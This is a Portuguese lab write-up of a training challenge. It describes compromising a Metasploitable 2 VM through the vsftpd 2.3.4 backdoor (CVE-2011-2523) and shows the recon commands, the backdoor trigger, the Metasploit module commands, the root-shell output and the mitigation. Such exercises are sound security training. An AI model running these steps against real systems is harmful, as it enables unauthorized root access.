# Desafio: Dio-Santander
**Alvo:** Metasploitable 2 (`192.168.15.6`)
**Vulnerabilidade Explorada:** `CVE-2011-2523`


- Configure o ambiente: Duas VMs (Kali Linux e Metasploitable 2) no Virtual Box, com rede interna ( host-only ).

![](https://github.com/Delandio/Dio-Santander-lab/blob/main/Imagens/01.png)

## Fase 1: Reconhecimento (Reconnaissance)

O objetivo inicial foi confirmar a conectividade com o alvo e identificar os serviços em execução.

### 1.1 Teste de Conectividade (Ping)
Um teste `ping` foi usado para verificar se o host estava ativo na rede.

* **Comando:** `ping -c 5 192.168.15.6`
* **Resultado:** **Sucesso.** O alvo respondeu a todas as 5 solicitações (0% de perda de pacotes), confirmando que estava online.

![](https://github.com/Delandio/Dio-Santander-lab/blob/main/Imagens/02.png)

### 1.2 Varredura de Portas e Serviços (Nmap)

Um scan `nmap` foi realizado para mapear as portas abertas e identificar as versões dos serviços.

* **Comando:** `nmap -v -sV 192.168.15.6`
* **Resultado Chave:** A varredura identificou diversos serviços, com destaque para a **Porta 21 (FTP)**.
    * `21/tcp open ftp vsftpd 2.3.4`

![](https://github.com/Delandio/Dio-Santander-lab/blob/main/Imagens/03.png)


---
## Fase 2: Análise de Vulnerabilidade

O foco foi direcionado ao serviço FTP, dada a sua versão específica.

* **Serviço Identificado:** `vsftpd 2.3.4`
* **Pesquisa:** Uma breve pesquisa ([como a referenciada no link da Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)) confirma que esta versão específica contém um **backdoor intencional** (`CVE-2011-2523`).
* **Mecanismo da Falha:** Esta versão do `vsftpd` foi distribuída com um código malicioso. Quando um nome de usuário contendo a sequência `:)` é enviado, o serviço ativa um *shell* reverso na porta `6200`.

---
---

## Fase 3: Exploração (Exploitation)

Para explorar essa vulnerabilidade, o **Metasploit Framework** foi utilizado, pois possui um módulo específico para automatizar esse ataque.

![](https://github.com/Delandio/Dio-Santander-lab/blob/main/Imagens/04.png)

### 3.1 Configuração do Módulo

O módulo `exploit/unix/ftp/vsftpd_234_backdoor` foi selecionado e configurado.

* `use exploit/unix/ftp/vsftpd_234_backdoor`
* `set rhosts 192.168.15.6` (Define o IP do alvo)
* `run` (Inicia o ataque)

![](https://github.com/Delandio/Dio-Santander-lab/blob/main/Imagens/05.png)

### 3.2 Resultado da Exploração

O Metasploit enviou a carga maliciosa (o nome de usuário com `:)`), ativou o backdoor e se conectou ao *shell* reverso fornecido pelo alvo.

* `[+] 192.168.15.6:21 - Backdoor service has been spawned, handling...`
* `[+] 192.168.15.6:21 - UID: uid=0(root) gid=0(root)`
* `[*] Command shell session 1 opened`

![](https://github.com/Delandio/Dio-Santander-lab/blob/main/Imagens/06.png)

---


## Fase 4: Pós-Exploração e Conclusão

O ataque foi **bem-sucedido** e resultou no comprometimento total do sistema.

* **Acesso Obtido:** Acesso **`root`** (superusuário), como indicado pelo `uid=0(root)`.
* **Impacto:** Controle total sobre a máquina alvo, permitindo ao atacante visualizar, modificar ou excluir quaisquer dados, além de usar a máquina como pivô para outros ataques na rede.
* **Mitigação:** A correção é simples: **atualizar imediatamente** o `vsftpd` para uma versão mais recente e corrigida (qualquer uma após a 2.3.4) que não contenha o backdoor.
